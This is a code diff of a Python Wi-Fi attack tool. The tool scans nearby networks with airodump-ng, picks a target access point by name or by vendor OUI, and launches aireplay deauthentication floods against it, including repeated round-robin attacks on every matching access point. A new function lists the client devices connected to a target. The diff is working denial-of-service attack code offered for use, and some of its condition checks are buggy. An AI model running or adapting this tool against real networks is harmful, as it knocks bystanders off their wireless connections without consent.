@@ -7,42 +7,38 @@ import subprocess
 import time
 import csv
 import pandas as pd
-import keyboard
 
-# variables
+from main import clear, ansi_escape_green, ansi_escape_red
+
+# TODO do not depend on global variables
 bssid_of_targetAP = 'not found'
 channel_of_targetAP = 'not found'
 terminals = ['x-terminal-emulator', 'gnome-terminal', 'konsole', 'xfce4-terminal']
-DeauthTimeout = 0 # if this is 0 then there wont be a timeout, if its any integer other than 0 it will timeout after that integer, timeout is set in some scripts and cleared after that script runs to not cause any issues. timeout is used when multiple APs are targeted
+DeauthTimeout = 0  # if this is 0 then there wont be a timeout, if its any integer other than 0 it will timeout after that integer, timeout is set in some scripts and cleared after that script runs to not cause any issues. timeout is used when multiple APs are targeted
 
 
-def clear():
-    subprocess.run('clear')
-
-
+#TODO make it fileless like scan_devices_in_AP()
 def scan_for_networks(interface):
-    # airodump =  subprocess.Popen('airodump-ng {} -w /tmp/networks --output-format csv '.format(interface), shell=True)
     airodump = subprocess.Popen('airodump-ng {} -w /tmp/networks --output-format csv &'.format(interface), shell=True,
                                 preexec_fn=os.setsid)
     time.sleep(10)
     clear()
     # subprocess.run(["killall", "airodump-ng"])
-    # airodump.terminate() this does not work because we are running it with shell=True which creates 2 processes. to kill a process run on shell=True
+    # airodump.terminate() this does not work because we are running it with shell=True. to kill a process run on shell=True
     # we need to execute this
-    os.killpg(airodump.pid,
-              signal.SIGTERM)  # but in order for this to work we also have to add preexec_fn=os.setsid to the airodump argument
-    time.sleep(0.5)
+    os.killpg(airodump.pid,signal.SIGTERM) # but in order for this to work we also have to add preexec_fn=os.setsid to the airodump argument
+    airodump.wait() # wait until process is killed
+    clear()
     files = sorted(glob.glob('/tmp/networks-*.csv'))
     latest_file = files[-1] if files else None
     if latest_file:
         with open(latest_file, 'r') as file:
             print(file.read())
-            target_AP = input('Write the Network name of the target AP')
+            target_AP = input('Write the Network name of the target AP ')
             return target_AP
     else:
-        print('no networks found')
-        return ""
-
+        print(ansi_escape_red('no networks found'))
+        return ''
 
 def process_ssids(file_name):
     df = pd.read_csv(file_name, header=None)
@@ -97,7 +93,7 @@ def scan_for_networks_by_OUI(interface):
 
 def scan_for_networks_by_OUI_Select_Router(interface):
     subprocess.run(['./ShellScripts/OUIFormatter.sh' + ' ' + f'{interface}'], shell=True)
-    return input('Write the OUI of target Router')
+    return input('Write the OUI of target Router: ')
 
 
 def retrieve_info_from_latest_networks_csv_file():
@@ -130,24 +126,24 @@ def retrieve_information_from_target_using_csv_file(networks_csv_file, targetAP)
                 channel_of_targetAP = row[3].strip()
 
 
+#TODO make it fileless like scan_devices_in_AP()
 def Deauth(interface, targetAP):
     global DeauthTimeout
     global bssid_of_targetAP
     global channel_of_targetAP
-    print('Gathering information on' + ' ' + targetAP)
+    print('Gathering information on' + ' ' + ansi_escape_green(targetAP))
     networks_csv_file = retrieve_info_from_latest_networks_csv_file()
     # bssid_of_targetAP, channel_of_targetAP = retrieve_information_from_target_using_csv_file(networks_csv_file,targetAP)
     # turns out decalring multiple variables using a return statement is not avaliable in python although there is a workaround by creating another function...
-    # i found it easier to mkae these variables global so i can declare them inside the method and call here
+    # I found it easier to make these variables global so I can declare them inside the method and call here
     retrieve_information_from_target_using_csv_file(networks_csv_file, targetAP)
     if (bssid_of_targetAP or channel_of_targetAP) == 'not found':
-        print()
-        print(targetAP + ' has no BSSID or Channel information cannot continue further' + ' check /tmp/networks-*.csv')
+        print(f' \n {ansi_escape_red(targetAP)} has no BSSID or Channel information cannot continue further check /tmp/networks-*.csv')
     else:
         clear()
-        print('Target BSSID found : ' + bssid_of_targetAP)
-        print('Target Channel found : ' + channel_of_targetAP)
-        print('Switching interface: ' + interface + ' to channel: ' + channel_of_targetAP)
+        print('Target BSSID found : ' + ansi_escape_green(bssid_of_targetAP))
+        print('Target Channel found : ' + ansi_escape_green(channel_of_targetAP))
+        print('Switching interface: ' + ansi_escape_green(interface) + ' to channel: ' + ansi_escape_green(channel_of_targetAP))
         switch_channel = ['iwconfig ' + interface + ' channel ' + channel_of_targetAP]
         subprocess.Popen(switch_channel, shell=True)
 
@@ -158,32 +154,35 @@ def Deauth(interface, targetAP):
                 if (DeauthTimeout == 0):
                     # to execute aireplay in new terminal im sending variables to './ShellScripts/aireplay.sh'
                     Deauth_script = './ShellScripts/aireplay.sh'
-                    subprocess.run([terminal, f'-e {Deauth_script}', bssid_of_targetAP,interface])  # just so you know shell=True breaks the use of sudo and wont allow this script to run for who knows why
+                    subprocess.run([terminal, f'-e {Deauth_script}', bssid_of_targetAP,
+                                    interface])  # just so you know shell=True breaks the use of sudo and wont allow this script to run for who knows why
                 elif (DeauthTimeout != 0):
                     # this script is used when we have to close the aireplay terminal and open a new one after a given time interval
                     # time intervals are set in the functions like Deauth_By_OUI
                     # if a time interval is needed instead of aireplay.sh the aireplay_with_interval.sh is used
                     Deauth_script = './ShellScripts/aireplay_with_interval.sh'
                     print(DeauthTimeout)
-                    subprocess.run([terminal, f'-e {Deauth_script}', bssid_of_targetAP,interface,DeauthTimeout]) # this gives error because DeauthTimeout is an integer and it has to be a string value,
+                    subprocess.run([terminal, f'-e {Deauth_script}', bssid_of_targetAP, interface,
+                                    DeauthTimeout])  # this gives error because DeauthTimeout is an integer and it has to be a string value,
                 break
             except FileNotFoundError:
                 print('no compatible terminal found: install ' + terminal)
 
-
-# TODO test at home
+#TODO make it fileless like scan_devices_in_AP()
 def Deauth_By_OUI(interface, targetOUI):
-    global DeauthTimeout # I selected Deauth to be done in 1minute intervals in this script
-    DeauthTimeout = '10' # its enclosed with '' since we cant send integer with subprocress.run but it gets this variable as an integer IDK WHY but it works
+    global DeauthTimeout  # I selected Deauth to be done in 1minute intervals in this script
+    DeauthTimeout = '10'  # its enclosed with '' since we cant send integer with subprocress.run but it gets this variable as an integer IDK WHY but it works
     files = sorted(glob.glob('/tmp/networks-*.csv'))
-    latest_file = files[-1] if files else '/tmp/networks-01.csv' ## this else is differnet from the one i used in scan networks because the shell script below will create the /tmp/networks-01.csv in its aireodump function. and if I were to leave it as None like before the script wont run because I pass it as a parameter
-    subprocess.run(['./ShellScripts/OUIFormatterKEEPFILE.sh' + ' ' + f'{interface}' + ' ' + f'{latest_file}'], shell=True)   # get csv file
+    latest_file = files[
+        -1] if files else '/tmp/networks-01.csv'  ## this else is differnet from the one i used in scan networks because the shell script below will create the /tmp/networks-01.csv in its aireodump function. and if I were to leave it as None like before the script wont run because I pass it as a parameter
+    subprocess.run(['./ShellScripts/OUIFormatterKEEPFILE.sh' + ' ' + f'{interface}' + ' ' + f'{latest_file}'],
+                   shell=True)  # get csv file
     clear()
     APs_in_OUI = []  # decalre a list to store all APs in OUI
-    with open('sorted_ssids.csv', 'r') as f:         # get the row count of entries in csv file
+    with open('sorted_ssids.csv', 'r') as f:  # get the row count of entries in csv file
         csv_reader = csv.reader(f)
-        for row in csv_reader: #
-            if row[0].startswith(targetOUI) and row[1] != '': # row[0] means first entrie
+        for row in csv_reader:  #
+            if row[0].startswith(targetOUI) and row[1] != '':  # row[0] means first entrie
                 APs_in_OUI.append(row[1])
 
     APs_in_OUI_Count = len(APs_in_OUI)
@@ -201,9 +200,10 @@ def Deauth_By_OUI(interface, targetOUI):
             return
         if selection == '1':
             for i in APs_in_OUI:
-                Deauth(interface,i.strip()) # strip is needed otherwise it wont be able to read csv file since variable may have extra space on front of the AP name
+                Deauth(interface,
+                       i.strip())  # strip is needed otherwise it wont be able to read csv file since variable may have extra space on front of the AP name
         elif selection == '2':
-            stop_flag = False # this is set to lisen for 'q' command from keybaord to stop the loop
+            stop_flag = False  # this is set to lisen for 'q' command from keybaord to stop the loop
             while not stop_flag:
                 for i in APs_in_OUI:
                     try:
@@ -219,4 +219,107 @@ def Deauth_By_OUI(interface, targetOUI):
                         stop_flag = True
 
 
+# this time I'm making a function without the use of csv output file for output management
+def scan_devices_in_AP(interface, targetAP):
+    def recursion():
+        selection = input('Rerun the Scan  Y/N ').lower()
+        while selection != 'y' or selection != 'n':
+            if selection == 'y':
+                scan_devices_in_AP(interface, targetAP)
+            elif selection == 'n':
+                return  # this return is not enoguh on its own because when recursion is used return will return to the parent of that recursive function
+                # so if we input 'Y' for 10 times we would need to input 'N' 10 times to actually return to the first function call
+            return  # that's why we have a return here so that it returns to the first function call
+
+    # save the output and error from airodump to variables
+    print('Airodump is running. Wait a while for it to complete')
+    airodump = subprocess.Popen('airodump-ng {}'.format(interface), shell=True,
+                                preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    # kill airodump after 10 seconds
+    time.sleep(10)
+    clear()
+    os.killpg(airodump.pid, signal.SIGTERM)
+    # .communicate() waits for the process to be completed. so it won't run until 'os.killpg(airodump.pid, signal.SIGTERM)' is successful.
+    output, error = airodump.communicate()
+
+
+    if isinstance(output, bytes):
+        # there was an issue with the output and error, when ---> output = output.decode(encoding='utf-8') it gives ---> UnicodeDecodeError, invalid continuation byte
+        # the solution is changing the encoding from 'utf-8' to 'latin-1'
+        output = output.decode(encoding='latin-1')
+    else:
+        print('there was a issue running Airodump, check interface. if everything is okay rerun')
+        recursion()
+
+
+    print(output)
+    print('==================================================================================================\n')
+
+    # check if airodump found the target AP or not
+    if targetAP not in output:
+        # IF AN ERROR CAUSED TARGET AP TO BE NOT FOUND IN THE AIRODUMP DATA THEN THIS WILL RUN (example: inteface not found)
+        if isinstance(error, bytes):
+            error = error.decode(encoding='latin-1')
+            if error:
+
+                print(f'{ansi_escape_green(targetAP)} was not found in scanned networks \n')
+                print('==================================================================================================\n')
+
+                print(f' There was an error with the airodump-ng. If you see networks listed above then there is no serious issue. Otherwise check the interface and the error')
+                print(f' Generally If you are seeing this then its a issue with the interface either its disconnected or you given a wrong name for the interface \n')
+                #TODO do not allow selecting interfaces that are not on the output of ip link show
+                print(f'ERROR: {ansi_escape_red(error)}')
+
+                # IF NO ERRORS OCCOURED AND NETWORK SCAN WAS SUCCESSFUL BUT TARGET AP WAS NOT ON THE SCANNED NETWORK LIST THEN THIS WILL RUN
+                print('==================================================================================================\n')
+                print(' But If you are seeing the networks then check connectivity of AP \n')
+                recursion()
+    # if airodump was successful in finding the targetAP
+    else:
+        targetAP_channel = ''
+        targetAP_BSSID = ''
+        # with split.('\n') make the output format in to lines/rows
+        # this for loop will check each line going down
+        for row in output.split('\n'):
+            column = row.split()
+            # the use of row.split() places comma ',' instead of all empty space
+            # the column looks like this for nearly all APs when using airodump
+            # ['BSSID', 'PWR', 'BEACONS', 'DATA', '/s', 'CHANNEL', '360', 'ENCRYPTION', 'CIPHER', 'AUTH', 'ESSID', '\x1b[0K']
+            # but airodump records contain other things as well, so first we need to be sure it matches this pattern
+            if len(column) >= 12 and (targetAP == column[10]):
+                    targetAP_BSSID = column[0]
+                    targetAP_channel = column[5]
+                    break
+        if (targetAP_channel and targetAP_BSSID) != '':
+            print(f' Target BSSID {ansi_escape_green(targetAP_BSSID)} \n CHANNEL {ansi_escape_green(targetAP_channel)}  \n AP {ansi_escape_green(targetAP)} \n \n Listing '
+                  f'Devices in this AP Please Wait' )
+            airodump = subprocess.Popen(f'airodump-ng -c {targetAP_channel} --bssid {targetAP_BSSID} {interface}',shell=True,
+                            preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            time.sleep(5)
+            clear()
+            os.killpg(airodump.pid, signal.SIGTERM)
+            output, error = airodump.communicate()
+            if isinstance(output, bytes):
+                clear()
+                output = output.decode(encoding='latin-1')
+                print(output + '\n')
+            return output
+
+
+    #TODO
+    def scan_devices_in_AP_Select_Device(interface, targetAP):
+        # run scan_devices_in_AP(interface,targetAP) to get output of airodump on target AP
+        output = scan_devices_in_AP(interface,targetAP)
+        clear()
+        print(output)
+        return
+    #TODO
+    def deauth_selected_device(interface, target_device_station):
+        return
+    #TODO
+    def deauth_devices_in_targetAP_with_interval(interface, target_device_station):
+        # Selection
+        # 1) Deauth all devices once and quit
+        # 2) Deauth all devices roundrobin
+        return
 
